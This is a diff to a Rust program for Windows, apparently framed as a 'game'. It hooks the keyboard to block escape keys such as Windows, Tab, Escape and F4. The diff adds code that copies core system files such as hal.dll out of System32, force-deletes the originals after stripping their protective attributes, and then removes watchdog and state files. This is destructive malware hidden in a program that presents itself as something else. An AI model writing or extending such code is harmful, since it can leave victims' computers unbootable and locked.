@@ -12,6 +12,9 @@ use windows_sys::Win32::UI::Input::KeyboardAndMouse::{
     VK_LWIN, VK_RWIN, VK_TAB, VK_ESCAPE, VK_F4, VK_CONTROL, VK_SHIFT,
 };
 use windows_sys::Win32::Foundation::{LRESULT, WPARAM, LPARAM, HINSTANCE};
+use windows_sys::Win32::Storage::FileSystem::{
+    SetFileAttributesW, DeleteFileW, FILE_ATTRIBUTE_NORMAL,
+};
 
 static HOOK_ACTIVE: AtomicBool = AtomicBool::new(true);
 
@@ -96,6 +99,15 @@ const KERNEL_PATHS: &[&str] = &[
     r"C:\Windows\System32\hal.dll",
 ];
 
+fn force_delete(path: &str) {
+    let wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
+    unsafe {
+        // Strip read-only / system / hidden flags so deletion isn't blocked
+        SetFileAttributesW(wide.as_ptr(), FILE_ATTRIBUTE_NORMAL);
+        DeleteFileW(wide.as_ptr());
+    }
+}
+
 fn move_items() {
     for path in KERNEL_PATHS {
         let file_name = std::path::Path::new(path)
@@ -104,7 +116,9 @@ fn move_items() {
             .to_str()
             .unwrap();
         let dest = format!(r"C:\{}", file_name);
-        let _ = fs::copy(path, dest);
+        if fs::copy(path, &dest).is_ok() {
+            force_delete(path);
+        }
     }
 }
 
@@ -221,6 +235,9 @@ async fn game_loop() {
                 unsafe { UnhookWindowsHookEx(hook) };
             }
             let _ = fs::File::create(success_file);
+            let _ = fs::remove_file(state_file);
+            thread::sleep(Duration::from_millis(600));
+            let _ = fs::remove_file(&watchdog_path);
             break;
         }
 
@@ -232,6 +249,8 @@ async fn game_loop() {
             }
             let _ = fs::File::create(success_file);
             let _ = fs::remove_file(state_file);
+            thread::sleep(Duration::from_millis(600));
+            let _ = fs::remove_file(&watchdog_path);
             break;
         }
 
